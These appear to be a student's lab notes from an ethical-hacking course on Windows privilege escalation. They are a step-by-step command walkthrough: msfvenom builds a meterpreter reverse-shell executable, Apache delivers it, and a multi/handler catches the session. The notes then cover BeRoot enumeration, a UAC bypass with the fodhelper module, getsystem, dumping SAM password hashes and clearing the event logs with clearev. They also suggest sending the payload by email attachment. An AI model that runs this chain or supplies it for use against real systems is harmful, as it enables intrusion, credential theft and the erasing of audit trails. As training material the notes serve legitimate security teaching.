- Privilege escalation tools such as BeRoot and linpostexp allow you to run a configuration assessment on a target system to find information about the underlying vulnerabilities of system resources such as services, file and directory permissions, kernel version, and architecture. Using this information, you can find a way to further exploit and elevate the privileges on the target system.

- Exploiting client-side vulnerabilities allows you to execute a command or binary on a target machine to gain higher privileges or bypass security mechanisms. Using these exploits, you can further gain access to privileged user accounts and credentials.
- Open terminal
	> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST =10.10.10.13 -f exe > Desktop/Exploit.exe
	
		- The above command will create a malicious Windows executable file named “**Exploit.exe**,” which will be saved on the parrot **Desktop**
	- If you want to create a new directory to share the **Exploit.exe** file with the target machine and provide the permissions, use the below commands:
	- Type **mkdir /var/www/html/share** and press **Enter** to create a shared folder
	- Type **chmod -R 755 /var/www/html/share** and press **Enter**
	- Type **chown -R www-data:www-data /var/www/html/share** and press **Enter**
		- Here, we are sending the malicious payload through a shared directory; but in real-time, you can send it as an email attachment or through physical means such as a hard drive or pen drive.
	> ls -la /var/www/html/ | grep share
	> cp /root/Desktop/Exploit.exe /var/www/html/share/ (to copy into shared folder)
	> service apache2 start (to start apache service)
	> msfconsole (to launch metasploit framework)
	> use exploit /multi/handler (to handle exploits launched outside the framework)
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST #hostip 
	> exploit -j -z
	
	- now go to windows or target machine and open http://#hostip/share in a browser
	- run Exploit.exe
	- now go back to linux machine
	- In the **Terminal** window, you can see that the **Meterpreter** session has successfully been opened.
		> session -i 1(here 1 is the id of the session)
		> getuid (displays current user ID)
		
			- Observe that the Meterpreter session is running with normal user privileges (**WINDOWS10\Admin**).

- Now that you have gained access to the target system with normal user privileges, your next task is to perform privilege escalation to attain higher-level privileges in the target system.
- First, we will use privilege escalation tools (BeRoot), which allow you to run a configuration assessment on a target system to find out information about its underlying vulnerabilities, services, file and directory permissions, kernel version, architecture, as well as other data. Using this information, you can find a way to further exploit and elevate the privileges on the target system.
- switch to terminal with active meterpreter session
	> upload /home/atttacker/Desktop/BeRoot/beRoot.exe (make sure this is present in said directory)
	
	- This command uploads the **beRoot.exe** file to the target system’s present working directory (here, **Downloads**).
	> shell (to open a shell)
	> beRoot.exe (to run beRoot tool)
	
	- A result appears, displaying information about service names along with their permissions, keys, writable directories, locations, and other vital data.
	- You can further scroll down to view the information related to startup keys, task schedulers, WebClient vulnerabilities, and other items.
	- **Windows privileges can be used to escalated privileges. These privileges include SeDebug, SeRestore & SeBackup & SeTakeOwnership, SeTcb & SeCreateToken, SeLoadDriver, and SeImpersonate & SeAssignPrimaryToken. BeRoot lists all available privileges and highlights if you have one of these tokens.**



- Another method for performing privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique.
- The command fails to dump the hashes from the SAM file located on the **Windows 10** machine and returns an error stating **Insufficient privileges to dump hashes!**.
- Now, we shall try to escalate the privileges by issuing a **getsystem** command that attempts to elevate the user privileges.
	> getsystem -t 1
	
	- The command fails to escalate privileges and returns an error stating **Operation failed**.
	- hence it becomes evident that we need admin privileges
- Now, we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
	- In this task, we will bypass **Windows UAC protection** via the FodHelper Registry Key. It is present in Metasploit as a **bypassuac_fodhelper** exploit.
> background (moves current session to background)
> use exploit/windows/local/bypassuac_fodhelper (to use bypass fodhelper)

	- Here, you need to configure the exploit. To know which options you need to configure in the exploit, type **show options** and press **Enter**. The **Module options** section appears, displaying the requirement for the exploit. Observe that the **SESSION** option is required, but the **Current Setting** is empty.
> show options
> set SESSION 1
- Now that we have configured the exploit, our next step will be to set and configure a payload. To do so, type **set payload windows/meterpreter/reverse_tcp** and press **Enter**. This will set the **meterpreter/reverse_tcp** payload.
	> set payload windows/meterpreter/reverse_tcp
	> show options
	> set LHOST #hostip 
	> set TARGET 0 (here 0 indicates exploit target ID, i.e, windows 10)
	> exploit
	> getuid
	> getsystem (shows got system, which means it is a success)
	
		- In Windows OSes, named pipes provide legitimate communication between running processes. You can exploit this technique to escalate privileges on the victim system to utilize a user account with higher access privileges.
	> getuid (see that it changes)
	
	- Let us check if we have successfully obtained the **SYSTEM/admin** privileges by issuing a Meterpreter command that requires these privileges in order to execute.
	- Now, we shall try to obtain password hashes located in the SAM file of the **Windows 10** machine.
		> run post/windows/gather/smart_hashdump
		- This time, Meterpreter successfully extracts the NTLM hashes and displays them.
			- You can further crack these password hashes to obtain plaintext passwords.
			- You can now remotely execute commands such as **clearev** to clear the event logs that require administrative or root privileges. To do so, type **clearev** and press **Enter**.
				> clearev